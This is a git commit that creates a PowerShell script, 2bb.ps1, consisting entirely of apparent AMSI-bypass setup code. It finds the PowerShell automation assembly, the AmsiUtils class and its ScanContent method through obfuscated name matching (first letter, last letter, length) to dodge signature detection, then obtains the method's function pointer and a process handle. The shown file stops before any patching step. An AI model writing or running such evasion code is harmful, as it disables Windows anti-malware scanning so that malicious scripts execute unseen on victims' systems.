56858b4dec24203d6bc59b8b62f90f19dcf08090
fvrsnr <155655459+fvrsnr@users.noreply.github.com>
2026-06-29 11:00:20 -0600

    Create 2bb.ps1

---
+++ 2bb.ps1
@@ -0,0 +1,30 @@
+$asmList = [appdomain]::currentdomain.getassemblies()
+$asmList | ForEach-Object {
+    if($_.Location -ne $null){
+        $asmName = $_.FullName.Split(",")[0]
+        If($asmName.StartsWith('S') -And $asmName.EndsWith('n') -And $asmName.Length -eq 28) {
+            $typeList = $_.GetTypes()
+        }
+    }
+}
+
+$typeList | ForEach-Object {
+    if($_.Name -ne $null){
+        If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
+            $mList = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
+        }
+    }
+}
+
+$mList | ForEach-Object {
+    if($_.Name -ne $null){
+        If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
+            $scanMethod = $_
+        }
+    }
+}
+
+$MethodPointer = $scanMethod.MethodHandle.GetFunctionPointer()
+$Handle = [NtHelpers]::GetCurrentProcess()
+$pad = 0
+$callRet = $false
